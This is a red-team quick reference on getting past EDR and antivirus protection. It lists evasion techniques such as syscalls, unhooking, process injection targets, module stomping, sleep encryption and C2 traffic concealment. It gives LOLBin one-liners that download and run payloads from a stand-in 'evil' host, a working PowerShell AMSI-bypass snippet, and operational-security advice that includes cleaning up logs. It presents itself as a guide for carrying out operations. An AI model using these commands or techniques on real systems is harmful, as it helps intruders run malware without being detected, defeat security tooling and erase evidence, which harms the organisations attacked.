# EDR/AV Bypass and Covert Operations Quick Reference

> Source: Summarized from multiple red team field experiences (2024-2026)
> Use case: Reference when executing operations in environments with EDR/AV protection

---

## Detection Layers and Corresponding Bypasses

| Detection Layer | What EDR Does | Bypass Approach |
|--------|-----------|---------|
| Static Signature | Matches known malicious file hashes/signatures | Custom compilation, encrypted payloads, modifying signatures |
| User-Mode Hook | Hooks ntdll.dll to monitor API calls | Direct syscalls / Unhooking / Bring Your Own ntdll |
| Kernel Callback | Registers process/thread/image load callbacks | Callback removal (requires driver) / Legitimate process injection |
| ETW | Collects events via ETW | Patch EtwEventWrite / Disable providers |
| Behavioral Analysis | Analyzes call sequences and behavior patterns | Delayed execution / Distributed operations / Mimic normal behavior |
| Memory Scanning | Periodically scans process memory | Heap encryption / Encrypt payload during sleep / Module stomping |
| Network Detection | Analyzes outbound traffic patterns | Domain fronting / Legitimate service tunneling / Encryption |

---

## Practical Bypass Techniques

### 1. Direct System Calls (Bypassing User-Mode Hooks)

```
Principle: Do not go through ntdll.dll; directly use syscall instructions to invoke the kernel
Tools: SysWhispers3 / HellsGate / TartarusGate
Effect: Bypasses all user-mode hooks
```

### 2. Unhooking (Restoring Original ntdll)

```
Method A: Re-map ntdll.dll from disk
Method B: Load a clean copy from the KnownDlls directory
Method C: Copy the .text section from a suspended process
Effect: Restores hooked APIs to their original state
```

### 3. Process Injection (Choosing Low-Monitoring Targets)

```
Recommended injection targets (low monitoring):
- RuntimeBroker.exe
- sihost.exe
- taskhostw.exe
- explorer.exe (slightly higher risk)

Avoid injecting into:
- lsass.exe (highly monitored)
- svchost.exe (some EDRs focus on this)
- powershell.exe / cmd.exe
```

### 4. Module Stomping

```
Principle: Write the payload into the .text section of a loaded legitimate DLL
Effect: Memory scans see a legitimate module, not suspicious RWX memory
```

### 5. Sleep Encryption (Ekko/Zilean)

```
Principle: Encrypt self-memory during beacon sleep
Effect: Payload signatures cannot be found during memory scans
Implementation: Register a Timer callback, encrypt before sleep, decrypt after wakeup
```

### 6. Call Stack Spoofing

```
Principle: Forge the call stack so API calls appear to come from legitimate code
Effect: Bypasses behavior detection based on call stacks
```

---

## C2 Traffic Concealment

| Technique | Principle | Detection Difficulty |
|------|------|---------|
| Domain Fronting | SNI and Host header differ in HTTPS requests | High |
| Cloudflare Workers | Relay through CF, appearing as normal HTTPS | High |
| Azure/AWS Legitimate Services | Use cloud service APIs as C2 channels | Extremely High |
| DNS over HTTPS | C2 data encoded in DNS queries | Medium |
| WebSocket | Long-lived connection, blending into normal web traffic | Medium |
| ICMP Tunnel | Data hidden in ICMP packets | Low (easy to detect) |

---

## LOLBins (Living Off the Land)

Using legitimate built-in system programs to perform malicious operations:

| Program | Purpose | Command Example |
|------|------|---------|
| certutil | Download files | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | Execute HTA | `mshta http://evil/payload.hta` |
| rundll32 | Load DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | Load SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | Remote execution | `wmic /node:target process call create "cmd"` |
| msiexec | Install MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | Download files | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | Execute commands | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI Bypass (PowerShell)

```powershell
# Classic Patch (may be detected by signature)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# More covert method: Reflectively modify AmsiScanBuffer
# Or downgrade PowerShell to v2 (no AMSI)
powershell -version 2
```

---

## Operational Security (OpSec) Principles

1. **Principle of Least Action** — Do not touch what you don't need to; use existing credentials rather than creating new ones
2. **Time Window** — Operate during the target's non-working hours (reduces the probability of manual review)
3. **Traffic Blending** — C2 communication frequency and size should mimic normal business traffic
4. **Tools Do Not Touch Disk** — Execute in memory, clean up after use
5. **Log Awareness** — Know what logs each operation produces, avoid or clean up beforehand
6. **Honeypot Identification** — Identify honeypots before operating (abnormally open services, overly enticing credentials)
7. **Segmented Operations** — Do not complete all steps at once; distribute them across multiple time periods
